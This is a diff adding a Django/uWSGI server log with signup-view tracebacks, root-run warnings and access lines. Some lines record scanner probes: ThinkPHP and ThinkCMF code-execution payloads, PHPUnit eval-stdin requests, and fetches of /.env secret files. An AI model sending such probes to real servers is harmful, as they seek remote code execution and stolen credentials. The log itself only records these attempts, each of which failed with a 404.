+    serializer = self.get_serializer(data=request.data)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 216, in data
+    self._load_data_and_files()
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 279, in _load_data_and_files
+    self._data, self._files = self._parse()
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 329, in _parse
+    stream = self.stream
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 203, in stream
+    self._load_stream()
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 309, in _load_stream
+    self._stream = io.BytesIO(self.body)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 416, in __getattr__
+    return getattr(self._request, attr)
+  File "/usr/local/lib/python3.8/site-packages/django/http/request.py", line 316, in body
+    raise RawPostDataException("You cannot access body after reading from request's data stream")
+django.http.request.RawPostDataException: You cannot access body after reading from request's data stream
+[pid: 10|app: 0|req: 147/147] 221.145.194.16 () {40 vars in 583 bytes} [Tue Mar 23 06:16:08 2021] POST /accounts/signup/ => generated 146525 bytes in 210 msecs (HTTP/1.1 500) 6 headers in 195 bytes (1 switches on core 0)
+Bad Request: /accounts/signup/
+[pid: 10|app: 0|req: 148/148] 221.145.194.16 () {40 vars in 583 bytes} [Tue Mar 23 06:16:27 2021] POST /accounts/signup/ => generated 58 bytes in 8 msecs (HTTP/1.1 400) 7 headers in 218 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 149/149] 221.145.194.16 () {40 vars in 655 bytes} [Tue Mar 23 06:20:33 2021] POST /accounts/signup/ => generated 196 bytes in 385 msecs (HTTP/1.1 201) 7 headers in 215 bytes (1 switches on core 0)
+Internal Server Error: /accounts/signup/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.8/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/generic/base.py", line 70, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 509, in dispatch
+    response = self.handle_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 469, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
+    raise exc
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 506, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/decorators.py", line 50, in handler
+    return func(*args, **kwargs)
+  File "./Accounts/views.py", line 90, in signup
+    token = obtain_jwt_token(request._request).data['token']
+  File "/usr/local/lib/python3.8/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/generic/base.py", line 70, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 509, in dispatch
+    response = self.handle_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 469, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
+    raise exc
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 506, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework_jwt/views.py", line 55, in post
+    serializer = self.get_serializer(data=request.data)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 216, in data
+    self._load_data_and_files()
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 279, in _load_data_and_files
+    self._data, self._files = self._parse()
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 329, in _parse
+    stream = self.stream
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 203, in stream
+    self._load_stream()
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 309, in _load_stream
+    self._stream = io.BytesIO(self.body)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/request.py", line 416, in __getattr__
+    return getattr(self._request, attr)
+  File "/usr/local/lib/python3.8/site-packages/django/http/request.py", line 316, in body
+    raise RawPostDataException("You cannot access body after reading from request's data stream")
+django.http.request.RawPostDataException: You cannot access body after reading from request's data stream
+[pid: 10|app: 0|req: 150/150] 221.145.194.16 () {40 vars in 583 bytes} [Tue Mar 23 06:25:45 2021] POST /accounts/signup/ => generated 146521 bytes in 214 msecs (HTTP/1.1 500) 6 headers in 195 bytes (1 switches on core 1)
+Bad Request: /accounts/signup/
+[pid: 10|app: 0|req: 151/151] 221.145.194.16 () {40 vars in 583 bytes} [Tue Mar 23 06:29:46 2021] POST /accounts/signup/ => generated 58 bytes in 47 msecs (HTTP/1.1 400) 7 headers in 218 bytes (1 switches on core 0)
+Bad Request: /accounts/signup/
+[pid: 10|app: 0|req: 152/152] 221.145.194.16 () {40 vars in 655 bytes} [Tue Mar 23 06:29:59 2021] POST /accounts/signup/ => generated 58 bytes in 10 msecs (HTTP/1.1 400) 7 headers in 218 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 153/153] 221.145.194.16 () {40 vars in 655 bytes} [Tue Mar 23 06:30:30 2021] POST /accounts/signup/ => generated 224 bytes in 320 msecs (HTTP/1.1 201) 7 headers in 215 bytes (1 switches on core 0)
+Bad Request: /accounts/signup/
+[pid: 10|app: 0|req: 154/154] 221.145.194.16 () {40 vars in 655 bytes} [Tue Mar 23 06:41:22 2021] POST /accounts/signup/ => generated 58 bytes in 2 msecs (HTTP/1.1 400) 7 headers in 218 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 155/155] 221.145.194.16 () {40 vars in 655 bytes} [Tue Mar 23 06:42:06 2021] POST /accounts/signup/ => generated 225 bytes in 359 msecs (HTTP/1.1 201) 7 headers in 215 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 156/156] 221.145.194.16 () {40 vars in 655 bytes} [Tue Mar 23 06:43:57 2021] POST /accounts/signup/ => generated 224 bytes in 322 msecs (HTTP/1.1 201) 7 headers in 215 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 157/157] 221.145.194.16 () {40 vars in 655 bytes} [Tue Mar 23 07:00:38 2021] POST /accounts/signup/ => generated 221 bytes in 389 msecs (HTTP/1.1 201) 7 headers in 215 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 158/158] 222.114.171.28 () {40 vars in 753 bytes} [Tue Mar 23 07:02:56 2021] GET / => generated 2691 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /robots.txt
+[pid: 10|app: 0|req: 159/159] 222.114.171.28 () {38 vars in 633 bytes} [Tue Mar 23 07:02:56 2021] GET /robots.txt?1616482977407 => generated 2753 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 160/160] 175.199.133.171 () {38 vars in 519 bytes} [Tue Mar 23 07:15:09 2021] GET / => generated 2685 bytes in 4 msecs (HTTP/1.0 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 161/161] 178.73.215.171 () {28 vars in 290 bytes} [Tue Mar 23 07:43:24 2021] GET / => generated 2683 bytes in 4 msecs (HTTP/1.0 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 162/162] 222.114.171.28 () {40 vars in 754 bytes} [Tue Mar 23 07:48:01 2021] GET / => generated 2691 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /robots.txt
+[pid: 10|app: 0|req: 163/163] 222.114.171.28 () {38 vars in 634 bytes} [Tue Mar 23 07:48:01 2021] GET /robots.txt?1616485681976 => generated 2753 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /swagger-ui.html
+[pid: 10|app: 0|req: 164/164] 222.114.171.28 () {40 vars in 784 bytes} [Tue Mar 23 07:48:24 2021] GET /swagger-ui.html => generated 2754 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /robots.txt
+[pid: 10|app: 0|req: 165/165] 222.114.171.28 () {38 vars in 634 bytes} [Tue Mar 23 07:48:25 2021] GET /robots.txt?1616485705612 => generated 2753 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 166/166] 192.35.168.32 () {34 vars in 381 bytes} [Tue Mar 23 09:02:54 2021] GET / => generated 2685 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 167/167] 221.145.194.16 () {40 vars in 655 bytes} [Tue Mar 23 09:04:38 2021] POST /accounts/signup/ => generated 221 bytes in 362 msecs (HTTP/1.1 201) 7 headers in 215 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/django.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Tue Mar 23 09:06:35 2021] ***
+compiled with version: 8.3.0 on 22 March 2021 13:13:09
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 3d9407d59472
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x56433f27f1d0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x56433f27f1d0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 13, cores: 2)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Tue Mar 23 09:06:46 2021] ***
+compiled with version: 8.3.0 on 23 March 2021 09:05:55
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 50deed5e50fb
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x563f23460200
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x563f23460200 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 8, cores: 2)
+Method Not Allowed: /accounts/signup/
+[pid: 8|app: 0|req: 1/1] 175.203.81.8 () {44 vars in 895 bytes} [Tue Mar 23 09:13:31 2021] GET /accounts/signup/ => generated 5602 bytes in 363 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 2/2] 175.203.81.8 () {42 vars in 832 bytes} [Tue Mar 23 09:13:39 2021] GET / => generated 2691 bytes in 6 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 3/3] 175.203.81.8 () {42 vars in 848 bytes} [Tue Mar 23 09:13:45 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 4/4] 175.203.81.8 () {44 vars in 879 bytes} [Tue Mar 23 09:13:54 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 1)
+Not Found: /sw4
+[pid: 8|app: 0|req: 5/5] 175.203.81.8 () {42 vars in 838 bytes} [Tue Mar 23 09:14:09 2021] GET /sw4 => generated 2718 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 6/6] 175.203.81.8 () {44 vars in 872 bytes} [Tue Mar 23 09:14:13 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 7/7] 175.203.81.8 () {44 vars in 879 bytes} [Tue Mar 23 09:14:16 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 8/8] 175.203.81.8 () {44 vars in 879 bytes} [Tue Mar 23 09:14:16 2021] GET /swagger/ => generated 2232 bytes in 4 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 9/9] 175.203.81.8 () {44 vars in 879 bytes} [Tue Mar 23 09:14:16 2021] GET /swagger/ => generated 2232 bytes in 4 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 10/10] 175.203.81.8 () {44 vars in 879 bytes} [Tue Mar 23 09:14:16 2021] GET /swagger/ => generated 2232 bytes in 4 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 11/11] 175.203.81.8 () {44 vars in 879 bytes} [Tue Mar 23 09:14:17 2021] GET /swagger/ => generated 2232 bytes in 6 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 12/12] 175.203.81.8 () {44 vars in 856 bytes} [Tue Mar 23 09:14:54 2021] GET / => generated 2691 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Bad Request: /accounts/login/
+[pid: 8|app: 0|req: 13/13] 221.145.194.16 () {40 vars in 653 bytes} [Tue Mar 23 09:17:20 2021] POST /accounts/login/ => generated 40 bytes in 2 msecs (HTTP/1.1 400) 7 headers in 210 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 14/14] 45.134.225.209 () {40 vars in 617 bytes} [Tue Mar 23 09:17:29 2021] GET / => generated 2688 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Bad Request: /accounts/login/
+[pid: 8|app: 0|req: 15/15] 221.145.194.16 () {40 vars in 653 bytes} [Tue Mar 23 09:17:35 2021] POST /accounts/login/ => generated 40 bytes in 2 msecs (HTTP/1.1 400) 7 headers in 210 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 16/16] 175.203.81.8 () {42 vars in 907 bytes} [Tue Mar 23 09:21:57 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 1)
+Method Not Allowed: /accounts/login/
+[pid: 8|app: 0|req: 17/17] 175.203.81.8 () {44 vars in 999 bytes} [Tue Mar 23 09:21:58 2021] GET /accounts/login/?next=/swagger/ => generated 7763 bytes in 20 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 18/18] 139.162.119.197 () {32 vars in 389 bytes} [Tue Mar 23 10:08:56 2021] GET / => generated 2685 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /boaform/admin/formLogin
+[pid: 8|app: 0|req: 19/19] 123.9.236.203 () {26 vars in 358 bytes} [Tue Mar 23 10:09:41 2021] GET /boaform/admin/formLogin?username=ec8&psd=ec8 => generated 2795 bytes in 4 msecs (HTTP/1.0 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /config/getuser
+[pid: 8|app: 0|req: 20/20] 205.185.122.102 () {40 vars in 661 bytes} [Tue Mar 23 10:19:29 2021] GET /config/getuser?index=0 => generated 2756 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 21/21] 211.55.223.205 () {42 vars in 730 bytes} [Tue Mar 23 11:17:32 2021] POST /accounts/login/ => generated 176 bytes in 204 msecs (HTTP/1.1 200) 7 headers in 202 bytes (1 switches on core 0)
+Bad Request: /accounts/login/
+[pid: 8|app: 0|req: 22/22] 211.55.223.205 () {40 vars in 653 bytes} [Tue Mar 23 11:19:41 2021] POST /accounts/login/ => generated 40 bytes in 2 msecs (HTTP/1.1 400) 7 headers in 210 bytes (1 switches on core 1)
+Bad Request: /accounts/login/
+[pid: 8|app: 0|req: 23/23] 211.55.223.205 () {40 vars in 653 bytes} [Tue Mar 23 11:21:14 2021] POST /accounts/login/ => generated 40 bytes in 2 msecs (HTTP/1.1 400) 7 headers in 210 bytes (1 switches on core 0)
+Bad Request: /accounts/login/
+[pid: 8|app: 0|req: 24/24] 211.55.223.205 () {40 vars in 653 bytes} [Tue Mar 23 11:21:18 2021] POST /accounts/login/ => generated 40 bytes in 2 msecs (HTTP/1.1 400) 7 headers in 210 bytes (1 switches on core 1)
+Bad Request: /accounts/login/
+[pid: 8|app: 0|req: 25/25] 211.55.223.205 () {40 vars in 653 bytes} [Tue Mar 23 11:24:21 2021] POST /accounts/login/ => generated 68 bytes in 195 msecs (HTTP/1.1 400) 7 headers in 210 bytes (1 switches on core 0)
+Bad Request: /accounts/login/
+[pid: 8|app: 0|req: 26/26] 211.55.223.205 () {40 vars in 653 bytes} [Tue Mar 23 11:25:52 2021] POST /accounts/login/ => generated 68 bytes in 160 msecs (HTTP/1.1 400) 7 headers in 210 bytes (1 switches on core 1)
+Bad Request: /accounts/login/
+[pid: 8|app: 0|req: 27/27] 211.55.223.205 () {40 vars in 653 bytes} [Tue Mar 23 11:25:56 2021] POST /accounts/login/ => generated 68 bytes in 159 msecs (HTTP/1.1 400) 7 headers in 210 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 28/28] 211.55.223.205 () {40 vars in 653 bytes} [Tue Mar 23 11:26:22 2021] POST /accounts/login/ => generated 176 bytes in 159 msecs (HTTP/1.1 200) 7 headers in 202 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 29/29] 211.55.223.205 () {40 vars in 653 bytes} [Tue Mar 23 11:27:58 2021] POST /accounts/login/ => generated 176 bytes in 159 msecs (HTTP/1.1 200) 7 headers in 202 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 30/30] 211.55.223.205 () {40 vars in 653 bytes} [Tue Mar 23 11:28:08 2021] POST /accounts/login/ => generated 176 bytes in 159 msecs (HTTP/1.1 200) 7 headers in 202 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 31/31] 211.55.223.205 () {40 vars in 653 bytes} [Tue Mar 23 11:28:45 2021] POST /accounts/login/ => generated 176 bytes in 159 msecs (HTTP/1.1 200) 7 headers in 202 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 32/32] 216.218.206.66 () {28 vars in 296 bytes} [Tue Mar 23 11:46:43 2021] GET / => generated 2685 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 33/33] 211.55.223.205 () {40 vars in 653 bytes} [Tue Mar 23 12:43:48 2021] POST /accounts/login/ => generated 176 bytes in 223 msecs (HTTP/1.1 200) 7 headers in 202 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 34/34] 211.55.223.205 () {40 vars in 653 bytes} [Tue Mar 23 12:46:02 2021] POST /accounts/login/ => generated 176 bytes in 158 msecs (HTTP/1.1 200) 7 headers in 202 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 8|app: 0|req: 35/35] 23.95.85.101 () {36 vars in 510 bytes} [Tue Mar 23 12:57:01 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 36/36] 23.95.85.101 () {40 vars in 617 bytes} [Tue Mar 23 12:57:02 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /ReportServer
+[pid: 8|app: 0|req: 37/37] 192.241.219.185 () {34 vars in 407 bytes} [Tue Mar 23 12:57:14 2021] GET /ReportServer => generated 2739 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 8|app: 0|req: 38/38] 45.146.165.157 () {38 vars in 700 bytes} [Tue Mar 23 13:00:42 2021] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2857 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 8|app: 0|req: 39/39] 45.146.165.157 () {36 vars in 612 bytes} [Tue Mar 23 13:00:42 2021] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 2856 bytes in 3 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /solr/admin/info/system
+[pid: 8|app: 0|req: 40/40] 45.146.165.157 () {34 vars in 544 bytes} [Tue Mar 23 13:00:42 2021] GET /solr/admin/info/system?wt=json => generated 2780 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /index.php
+[pid: 8|app: 0|req: 41/41] 45.146.165.157 () {34 vars in 708 bytes} [Tue Mar 23 13:00:42 2021] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 => generated 2852 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /api/jsonws/invoke
+[pid: 8|app: 0|req: 42/42] 45.146.165.157 () {38 vars in 598 bytes} [Tue Mar 23 13:00:43 2021] POST /api/jsonws/invoke => generated 2758 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /console/
+[pid: 8|app: 0|req: 43/43] 45.146.165.157 () {34 vars in 501 bytes} [Tue Mar 23 13:00:43 2021] GET /console/ => generated 2730 bytes in 3 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /wp-content/plugins/wp-file-manager/readme.txt
+[pid: 8|app: 0|req: 44/44] 45.146.165.157 () {34 vars in 575 bytes} [Tue Mar 23 13:00:43 2021] GET /wp-content/plugins/wp-file-manager/readme.txt => generated 2841 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 45/45] 45.146.165.157 () {36 vars in 641 bytes} [Tue Mar 23 13:00:44 2021] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 2752 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /Autodiscover/Autodiscover.xml
+[pid: 8|app: 0|req: 46/46] 45.146.165.157 () {38 vars in 624 bytes} [Tue Mar 23 13:00:44 2021] POST /Autodiscover/Autodiscover.xml => generated 2794 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /_ignition/execute-solution
+[pid: 8|app: 0|req: 47/47] 45.146.165.157 () {36 vars in 590 bytes} [Tue Mar 23 13:00:44 2021] GET /_ignition/execute-solution => generated 2784 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 48/48] 45.146.165.157 () {34 vars in 544 bytes} [Tue Mar 23 13:00:44 2021] GET /?XDEBUG_SESSION_START=phpstorm => generated 2718 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 8|app: 0|req: 49/49] 122.114.76.100 () {36 vars in 512 bytes} [Tue Mar 23 13:06:38 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 50/50] 122.114.76.100 () {40 vars in 619 bytes} [Tue Mar 23 13:06:39 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 8|app: 0|req: 51/51] 207.180.238.248 () {36 vars in 513 bytes} [Tue Mar 23 13:09:50 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 52/52] 207.180.238.248 () {40 vars in 620 bytes} [Tue Mar 23 13:09:54 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /core/.env
+[pid: 8|app: 0|req: 53/53] 207.180.238.248 () {36 vars in 523 bytes} [Tue Mar 23 13:09:59 2021] GET /core/.env => generated 2730 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 54/54] 207.180.238.248 () {40 vars in 620 bytes} [Tue Mar 23 13:10:11 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 55/55] 175.203.81.8 () {44 vars in 915 bytes} [Tue Mar 23 13:38:45 2021] GET / => generated 2691 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 56/56] 175.203.81.8 () {42 vars in 901 bytes} [Tue Mar 23 13:38:51 2021] GET /notes => generated 0 bytes in 0 msecs (HTTP/1.1 301) 6 headers in 189 bytes (1 switches on core 1)
+Unauthorized: /notes/
+[pid: 8|app: 0|req: 57/57] 175.203.81.8 () {42 vars in 903 bytes} [Tue Mar 23 13:38:51 2021] GET /notes/ => generated 5049 bytes in 10 msecs (HTTP/1.1 401) 9 headers in 431 bytes (1 switches on core 0)
+Not Found: /0bef
+[pid: 8|app: 0|req: 58/58] 172.105.89.161 () {26 vars in 280 bytes} [Tue Mar 23 13:41:22 2021] GET /0bef => generated 2713 bytes in 4 msecs (HTTP/1.0 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 59/59] 221.145.194.16 () {40 vars in 653 bytes} [Tue Mar 23 14:44:51 2021] POST /accounts/login/ => generated 176 bytes in 197 msecs (HTTP/1.1 200) 7 headers in 202 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/django.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Tue Mar 23 14:47:27 2021] ***
+compiled with version: 8.3.0 on 23 March 2021 09:05:55
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 50deed5e50fb
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
